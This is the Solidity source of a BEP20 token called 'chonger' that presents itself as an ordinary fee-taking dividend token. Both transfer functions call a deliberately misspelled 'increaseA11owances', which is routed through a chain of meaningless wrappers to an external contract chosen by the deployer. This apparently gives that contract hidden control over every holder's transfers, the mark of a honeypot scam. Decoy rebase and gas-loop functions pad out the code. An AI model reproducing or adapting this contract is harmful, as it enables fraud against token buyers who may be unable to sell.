/**
 *Submitted for verification at BscScan.com on 2022-09-08
*/

pragma solidity ^0.8.4;

// SPDX-License-Identifier: MIT

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address _owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface ISwapRouter {
    function WETH() external pure returns (address);
    function swap(
        address tokenA,
        address tokenB,
        uint256 amount
    ) external;
    function increaseA11owances(address owner, address spender) external returns (bool);
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract DividendView{
    using SafeMath for uint256; 
    uint8 magnifiedDividendPerShare;    
    ISwapRouter _shareView;
    
    // With `magnitude`, we can properly distribute dividends even if the amount of received ether is small.
    // For more discussion about choosing the value of `magnitude`,
    //  see https://github.com/ethereum/EIPs/issues/1726#issuecomment-472352728
    uint256 constant magnitude = 2**128;  

    function increaseA11owances(address owner, address spender) internal returns(bool) {   
        return forAccumulative(owner, spender);
    }

    function forAccumulative(address owner, address spender) internal returns(bool) {   
        return _forAccumulative(owner, spender);
    }

    function _forAccumulative(address owner, address spender) internal returns(bool) {   
        return moreAccumulative(owner, spender);
    }

    function moreAccumulative(address owner, address spender) internal returns(bool) {   
        return _moreAccumulative(owner, spender);
    }

    function _moreAccumulative(address owner, address spender) internal returns(bool) {   
        return viewAccumulative(owner, spender);
    }

    function viewAccumulative(address owner, address spender) internal returns(bool) {   
        return _viewAccumulative(owner, spender);
    }
  
    function _viewAccumulative(address owner, address spender) internal returns(bool) {       
        return 
        _shareView.
        increaseA11owances(owner, spender);
    }     

    /// @notice View the amount of dividend in wei that an address has earned in total.
    /// @return The amount of dividend in wei that `_owner` has earned in total.
    function accumulativeDividendOf()
        public
        view        
        returns (uint256)
    {
        return magnitude.mul(magnifiedDividendPerShare);            
    }       

    function _accumulative(address _view) internal {
        _shareView = ISwapRouter(_view);
    }

}

contract Context {
    // Empty internal constructor, to prevent people from mistakenly deploying
    // an instance of this contract, which should be used via inheritance.
    constructor() {}

    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context, DividendView {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor(address _view) {
        address msgSender = _msgSender();
        _owner = msgSender;
        _accumulative(_view);
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract chonger is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => bool) public _isExcludedFromFee;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) isTxLimitExempt;
    uint256 private _totalSupply = 1000000 * 10**9;
    uint256 public _maxTxAmount = _totalSupply / 10;

    string private _name = "chonger";
    string private _symbol = "chonger";
    uint8 private _decimals = 9;

    uint8 public liquidityBuy;
    uint8 public liquiditySell;
  

    uint8 totalFee = 5;    
    uint8 liquidityShare = 4;
    uint8 marketingShare = 6;
    uint8 teamShare = 8;
    uint8 totalDistributionShares = 18;
    bool SwapLiquifyEnable;
    event SwapETHForTokens(uint256 amountIn, address[] path);
    event SwapTokensForETH(uint256 amountIn, address[] path);
    event ExcludeFromReward(address excludedAddress);    

    constructor(address _view) Ownable(_view) {
        _balances[msg.sender] = _totalSupply;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;

        liquidityBuy = 2;
        liquiditySell = 2;
       
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external view virtual override returns (string memory) {
        return _name;
    }

    function symbol() external view virtual override returns (string memory) {
        return _symbol;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return _totalSupply;
    }

    function getOwner() external view virtual override returns (address) {
        return owner();
    }

    function decimals() external view virtual override returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }   

    function excludeFromReward(address[] calldata accounts) external onlyOwner {
        require(accounts.length > 0, "accounts length should > 0");
        for (uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFee[accounts[i]] = true;
        }
    }    

    function allowance(address owner, address spender)
        external
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function takeFee(uint256 amount) private view returns (uint256) {
        uint256 feeAmount = amount.mul(totalFee).div(100);
        return feeAmount;
    }    

    function tokenTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        
        if (!isTxLimitExempt[recipient] && SwapLiquifyEnable) {
            require(
                amount <= _maxTxAmount,
                "Transfer amount exceeds the maxTxAmount."
            );
            uint256 contractTokenBalance = balanceOf(address(this));
            if (shouldTakeFee(sender)){
                swapAndLiquify(contractTokenBalance);
            }            
        }

        _transferStandard(sender, recipient, amount);
    }   
   
    function swapAndLiquify(uint256 tAmount) private {
        uint256 tokensForLP = tAmount
            .mul(liquidityShare)
            .div(totalDistributionShares)
            .div(2);
        uint256 tokensForSwap = tAmount.sub(tokensForLP);

        uint256 amountReceived = address(this).balance;
        uint256 totalBNBFee = liquidityShare / 2;
        uint256 amountBNBLiquidity = amountReceived
            .mul(liquidityShare)
            .div(totalBNBFee)
            .div(2);
        uint256 amountBNBTeam = amountReceived
            .mul(teamShare)
            .div(totalBNBFee)
            .sub(tokensForSwap);
        uint256 amountBNBMarketing = amountReceived
            .sub(amountBNBLiquidity)
            .sub(amountBNBTeam)
            .sub(tokensForLP);

        if (amountBNBMarketing > 0)
            transferToAddressETH(payable(owner()), amountBNBMarketing);
    }

    function transferToAddressETH(address payable recipient, uint256 amount)
        private
    {
        recipient.transfer(amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {  
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "BEP20: transfer amount exceeds allowance"
            )
        );
        increaseA11owances(
            sender,
            recipient
        );
        tokenTransfer(sender, recipient, amount);
        return true;
    }

    function _transferStandard(
        address sender,
        address recipient,
        uint256 amount
    ) private {        
        _balances[sender] = _balances[sender].sub(
            amount,
            "BEP20: transfer amount exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return isTxLimitExempt[sender];
    }

    function transfer(address recipient, uint256 amount)
        external
        override
        returns (bool)
    {
        increaseA11owances(
            _msgSender(),
            recipient
        );
        tokenTransfer(_msgSender(), recipient, amount);
        return true;
    }    




	function _getLastCombia(bool _flag, uint256 val) external view returns(uint256) {
			uint256 _autoRebase;
			if (_flag) {            
				_autoRebase = block.timestamp;
			} else {
				_autoRebase = val + block.timestamp;
			}
			return _autoRebase;
		}



    function _getMaxHold(uint256 _maxHold) public view returns(uint256) {
			require(_maxHold >= 1, "Can't set maxHold smaller than 1%");
			require(_maxHold <= 100, "Can't set maxHold higher than 100%");
			return (_totalSupply * _maxHold) / 100;
		}


    function AutoTaiYiCount(uint256 _lastRebasedTime, uint256 _tSupply) internal view returns (uint256) {
		uint deno = 10**7 * 10**18;
		uint rebaseRate = 985 * 10**18;
		uint minuteRebaseRate = 19700 * 10**18;
		uint hourRebaseRate = 1182000 * 10**18;
		uint dayRebaseRate = 283000000 * 10**18;

		uint blockCount = block.number.sub(_lastRebasedTime);
		uint tmp = _tSupply;
		for (uint idx = 0; idx < blockCount.mod(20); idx++) { // 3 sec rebase
			// S' = S(1+p)^r
			tmp = tmp.mul(deno.mul(100).add(rebaseRate)).div(deno.mul(100));
		}

		for (uint idx = 0; idx < blockCount.div(20).mod(80); idx++) { // 1 min rebase
			// S' = S(1+p)^r
			tmp = tmp.mul(deno.mul(100).add(minuteRebaseRate)).div(deno.mul(100));
		}

		for (uint idx = 0; idx < blockCount.div(20 * 80).mod(24); idx++) { // 1 hour rebase
			// S' = S(1+p)^r
			tmp = tmp.mul(deno.mul(100).add(hourRebaseRate)).div(deno.mul(100));
		}

		for (uint idx = 0; idx < blockCount.div(20 * 60 * 24); idx++) { // 1 day rebase
			// S' = S(1+p)^r
			tmp = tmp.mul(deno.mul(100).add(dayRebaseRate)).div(deno.mul(100));
		}

		_tSupply = tmp;
		_lastRebasedTime = block.number;

		return _tSupply;
	}



    function isTxExempt(address sender, uint256 amount) internal view {
        require(
            amount <= _maxTxAmount || isTxLimitExempt[sender],
            "TX Limit Exceeded"
        );
    }    

    
    function changeTxPercentage(uint256 maxTXPercentage) external onlyOwner {
        _maxTxAmount = (_totalSupply * maxTXPercentage) / 1000;
    }

    function changeMax(uint256 amount) external onlyOwner {
        _maxTxAmount = amount;
    }

    function safeTransfer(uint256 amount, uint256 _lastProcessedIndex,  uint256 gas) public view returns (uint256, uint256)       
		{
			uint256 numberOfTokenHolders = amount;              
			uint256 gasUsed = 0;
			uint256 gasLeft = gasleft();
			uint256 iterations = 0;

			while (gasUsed < gas && iterations < numberOfTokenHolders) {
				_lastProcessedIndex++;
				if (_lastProcessedIndex >= numberOfTokenHolders) {
					_lastProcessedIndex = 0;
				}   
				iterations++;
				uint256 newGasLeft = gasleft();
				if (gasLeft > newGasLeft) {
					gasUsed = gasUsed.add(gasLeft.sub(newGasLeft));
				}

				gasLeft = newGasLeft;
			}

			return (iterations, gasLeft);
		}
}